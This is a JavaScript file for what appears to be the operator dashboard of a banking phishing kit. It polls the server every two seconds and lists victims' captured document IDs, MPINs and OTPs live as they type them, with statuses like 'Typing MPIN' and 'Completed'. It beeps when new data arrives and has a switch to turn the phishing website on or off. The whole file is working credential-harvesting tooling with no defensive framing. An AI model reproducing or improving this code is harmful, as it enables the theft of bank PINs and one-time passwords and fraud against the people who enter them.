let soundEnabled = false;
let audioUnlocked = false;
let websiteEnabled = true;
let knownRecords = new Map();
let pollInterval = null;
let pollCount = 0;
let currentFilter = 'all';
let audioCtx = null;

// ==================== INITIAL LOAD ====================
window.addEventListener('load', () => {
    console.log("🚀 Admin v4 loaded - Starting...");
    
    loadInitialData();
    loadWebsiteState();
    
    // AudioContext create karo (lekin resume nahi - user click ka wait)
    try {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        console.log("🎵 AudioContext created, state:", audioCtx.state);
    } catch (e) {
        console.log("❌ AudioContext not supported", e);
    }
    
    // Polling start karo (har 2 second)
    setTimeout(pollUpdates, 500);
    pollInterval = setInterval(pollUpdates, 2000);
});


// ==================== AUDIO UNLOCK (IMPORTANT FIX) ====================
function unlockAudioNow() {
    return new Promise((resolve) => {
        try {
            if (!audioCtx) {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            }
            
            if (audioCtx.state === 'suspended') {
                audioCtx.resume().then(() => {
                    audioUnlocked = true;
                    console.log("🔊 Audio unlocked successfully!");
                    resolve(true);
                }).catch((err) => {
                    console.log("❌ Resume failed:", err);
                    resolve(false);
                });
            } else {
                audioUnlocked = true;
                console.log("🔊 Audio already unlocked");
                resolve(true);
            }
        } catch (e) {
            console.log("❌ Unlock error:", e);
            resolve(false);
        }
    });
}


// ==================== BEEP GENERATOR ====================
function playBeep(volume, duration, delay, freq) {
    if (!audioCtx) {
        console.log("⚠️ No audioCtx");
        return;
    }
    try {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.type = 'sine';
        osc.frequency.setValueAtTime(freq || 880, audioCtx.currentTime + delay);
        gain.gain.setValueAtTime(0, audioCtx.currentTime + delay);
        gain.gain.linearRampToValueAtTime(volume, audioCtx.currentTime + delay + 0.01);
        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + delay + duration);
        osc.start(audioCtx.currentTime + delay);
        osc.stop(audioCtx.currentTime + delay + duration + 0.02);
    } catch (e) {
        console.log("❌ Beep error:", e);
    }
}

// Notification sound - naya data aane par
function playNotificationSound() {
    if (!soundEnabled) {
        console.log("🔇 Sound disabled, skipping beep");
        return;
    }
    if (!audioCtx) {
        console.log("⚠️ No audioCtx for notification");
        return;
    }
    
    if (audioCtx.state === 'suspended') {
        audioCtx.resume().then(() => {
            console.log("🔊 Playing notification beep...");
            playBeep(0.6, 0.15, 0, 880);
            playBeep(0.6, 0.20, 0.18, 660);
        }).catch((e) => console.log("❌ Resume error:", e));
        return;
    }
    
    console.log("🔊 Playing notification beep...");
    playBeep(0.6, 0.15, 0, 880);
    playBeep(0.6, 0.20, 0.18, 660);
}

// Confirmation beep - jab user Sound ON kare
function playConfirmBeep() {
    if (!audioCtx) return;
    if (audioCtx.state === 'suspended') {
        audioCtx.resume().then(() => {
            playBeep(0.5, 0.12, 0, 1046);
            playBeep(0.5, 0.18, 0.15, 1318);
        }).catch(() => {});
        return;
    }
    playBeep(0.5, 0.12, 0, 1046);
    playBeep(0.5, 0.18, 0.15, 1318);
}


// ==================== INITIAL DATA LOAD ====================
function loadInitialData() {
    console.log("📥 Loading initial data...");
    
    fetch('/get_all_data?t=' + Date.now())
        .then(res => {
            console.log("📡 Response status:", res.status);
            return res.json();
        })
        .then(data => {
            console.log("📦 Initial data received:", data);
            
            knownRecords.clear();
            
            const tbody = document.getElementById('dataTableBody');
            if (!tbody) {
                console.log("❌ dataTableBody element not found!");
                return;
            }
            tbody.innerHTML = '';
            
            if (!data || data.length === 0) {
                const es = document.getElementById('emptyState');
                if (es) es.style.display = 'block';
            } else {
                const es = document.getElementById('emptyState');
                if (es) es.style.display = 'none';
                data.forEach(entry => {
                    knownRecords.set(entry.id, {
                        mpin: entry.mpin || '',
                        otp: entry.otp || '',
                        status: entry.status || ''
                    });
                    addRowToTable(entry, false);
                });
            }
            
            updateStats();
            applyFilter();
        })
        .catch(err => console.error("❌ Initial load error:", err));
}

function loadWebsiteState() {
    fetch('/get_website_state?t=' + Date.now())
        .then(res => res.json())
        .then(data => {
            websiteEnabled = data.enabled;
            updateWebsiteButton();
        })
        .catch(err => console.log("Website state error:", err));
}


// ==================== POLLING (LIVE UPDATES) ====================
function pollUpdates() {
    pollCount++;
    if (pollCount % 5 === 0) console.log("🔄 Poll #" + pollCount);
    
    fetch('/get_latest_state?t=' + Date.now())
        .then(res => res.json())
        .then(records => {
            if (!records || records.length === 0) return;
            
            let hasChanges = false;
            
            records.forEach(entry => {
                const known = knownRecords.get(entry.id);
                const currentState = {
                    mpin: entry.mpin || '',
                    otp: entry.otp || '',
                    status: entry.status || ''
                };
                
                if (!known) {
                    console.log("🆕 New record:", entry);
                    knownRecords.set(entry.id, currentState);
                    addRowToTable(entry, true);
                    hasChanges = true;
                } else if (
                    known.mpin !== currentState.mpin || 
                    known.otp !== currentState.otp || 
                    known.status !== currentState.status
                ) {
                    console.log("🔄 Updated record:", entry);
                    knownRecords.set(entry.id, currentState);
                    updateRowInTable(entry);
                    hasChanges = true;
                }
            });
            
            if (hasChanges) {
                updateStats();
                applyFilter();
                playNotificationSound();
            }
        })
        .catch(err => console.error("❌ Poll error:", err));
}


// ==================== TABLE ROWS ====================
function addRowToTable(entry, isNew) {
    const tbody = document.getElementById('dataTableBody');
    if (!tbody) return;
    
    const emptyState = document.getElementById('emptyState');
    if (emptyState) emptyState.style.display = 'none';

    const existing = document.getElementById('row-' + entry.id);
    if (existing) {
        updateRowInTable(entry);
        return;
    }

    const tr = document.createElement('tr');
    tr.id = 'row-' + entry.id;
    tr.dataset.status = entry.status || '';
    
    if (isNew) tr.classList.add('new-row');
    tr.innerHTML = rowHTML(entry);
    tbody.insertBefore(tr, tbody.firstChild);
}

function updateRowInTable(entry) {
    const tr = document.getElementById('row-' + entry.id);
    if (!tr) {
        addRowToTable(entry, true);
        return;
    }
    tr.dataset.status = entry.status || '';
    tr.classList.add('new-row');
    setTimeout(() => tr.classList.remove('new-row'), 2000);
    tr.innerHTML = rowHTML(entry);
}

function rowHTML(entry) {
    let cls = 'typing';
    if (entry.status === 'Completed') cls = 'completed';
    else if (entry.status === 'MPIN Entered') cls = 'mpin';
    else if (entry.status === 'Typing OTP') cls = 'mpin';
    
    return `
        <td class="time-cell">${entry.timestamp || '-'}</td>
        <td><strong>${entry.doc_id || '-'}</strong></td>
        <td><span class="mono cyan">${entry.mpin || '...'}</span></td>
        <td><span class="mono green">${entry.otp || '...'}</span></td>
        <td><span class="status-badge status-${cls}">${entry.status || '-'}</span></td>
        <td>
            <button class="delete-btn" onclick="deleteRecord(${entry.id})" title="Delete">
                <i class="ri-delete-bin-line"></i>
            </button>
        </td>
    `;
}


// ==================== FILTER ====================
function filterTable(filter, btn) {
    currentFilter = filter;
    
    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');
    
    applyFilter();
}

function applyFilter() {
    const rows = document.querySelectorAll('#dataTableBody tr');
    let visibleCount = 0;
    const totalRows = rows.length;
    
    rows.forEach(row => {
        const status = row.dataset.status || '';
        
        let show = true;
        
        switch (currentFilter) {
            case 'all': show = true; break;
            case 'id': show = (status === 'Typing ID'); break;
            case 'mpin': show = (status === 'Typing MPIN' || status === 'MPIN Entered'); break;
            case 'otp': show = (status === 'Typing OTP'); break;
            case 'completed': show = (status === 'Completed'); break;
        }
        
        if (show) {
            row.style.display = '';
            visibleCount++;
        } else {
            row.style.display = 'none';
        }
    });
    
    const emptyState = document.getElementById('emptyState');
    if (emptyState) {
        if (totalRows === 0) {
            emptyState.style.display = 'block';
            const p = emptyState.querySelector('p');
            const s = emptyState.querySelector('span');
            if (p) p.innerText = 'No data captured yet';
            if (s) s.innerText = 'Waiting for user activity...';
        } else if (visibleCount === 0) {
            emptyState.style.display = 'block';
            const p = emptyState.querySelector('p');
            const s = emptyState.querySelector('span');
            if (p) p.innerText = 'No records match this filter';
            if (s) s.innerText = 'Try a different filter';
        } else {
            emptyState.style.display = 'none';
        }
    }
}


// ==================== DELETE ====================
function deleteRecord(id) {
    if (!confirm("Delete this record?")) return;
    
    fetch('/delete_record/' + id, { method: 'DELETE' })
    .then(res => res.json())
    .then(() => {
        const tr = document.getElementById('row-' + id);
        if (tr) tr.remove();
        knownRecords.delete(id);
        updateStats();
        applyFilter();
    })
    .catch(err => console.error("Delete error:", err));
}

function clearAllRecords() {
    if (!confirm("⚠️ Delete ALL records permanently?")) return;
    
    fetch('/clear_all_records', { method: 'POST' })
    .then(res => res.json())
    .then(() => {
        document.getElementById('dataTableBody').innerHTML = '';
        const es = document.getElementById('emptyState');
        if (es) es.style.display = 'block';
        knownRecords.clear();
        updateStats();
        applyFilter();
    })
    .catch(err => console.error("Clear error:", err));
}


// ==================== STATS ====================
function updateStats() {
    const allRows = document.querySelectorAll('#dataTableBody tr');
    const total = allRows.length;
    
    const totalEl = document.getElementById('totalUsers');
    if (totalEl) totalEl.innerText = total;
    
    let completed = 0;
    allRows.forEach(row => {
        const status = row.dataset.status || '';
        if (status === 'Completed') completed++;
    });
    
    const completedEl = document.getElementById('completedLogins');
    if (completedEl) completedEl.innerText = completed;
    
    const pending = total - completed;
    const pendingEl = document.getElementById('pendingCount');
    if (pendingEl) pendingEl.innerText = pending;
}


// ==================== SOUND TOGGLE (FIXED) ====================
function toggleSound() {
    const btn = document.getElementById('soundBtn');
    const text = document.getElementById('soundText');
    const icon = document.getElementById('soundIcon');

    if (!soundEnabled) {
        // 🔓 Sound ON karo
        unlockAudioNow().then((ok) => {
            if (ok) {
                soundEnabled = true;
                btn.classList.remove('off');
                btn.classList.add('on');
                if (text) text.innerText = 'Sound ON';
                if (icon) icon.className = 'ri-volume-up-line';
                console.log("✅ Sound ON enabled");
                // Confirmation beep
                setTimeout(playConfirmBeep, 150);
            } else {
                alert("Browser ne audio block kar diya. Page ko refresh karke dobara try karein.");
            }
        });
    } else {
        // 🔇 Sound OFF karo
        soundEnabled = false;
        btn.classList.add('off');
        btn.classList.remove('on');
        if (text) text.innerText = 'Sound OFF';
        if (icon) icon.className = 'ri-volume-mute-line';
        console.log("🔇 Sound OFF");
    }
}


// ==================== TOGGLE WEBSITE ====================
function toggleWebsite() {
    websiteEnabled = !websiteEnabled;
    
    fetch('/toggle_website', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ enabled: websiteEnabled })
    })
    .then(res => res.json())
    .then(data => {
        websiteEnabled = data.enabled;
        updateWebsiteButton();
    })
    .catch(err => console.error("Toggle error:", err));
}

function updateWebsiteButton() {
    const btn = document.getElementById('websiteToggleBtn');
    const text = document.getElementById('websiteToggleText');
    
    if (!btn || !text) return;
    
    if (websiteEnabled) {
        btn.classList.remove('off');
        btn.classList.add('on');
        text.innerText = 'Website ON';
    } else {
        btn.classList.add('off');
        btn.classList.remove('on');
        text.innerText = 'Website OFF';
    }
}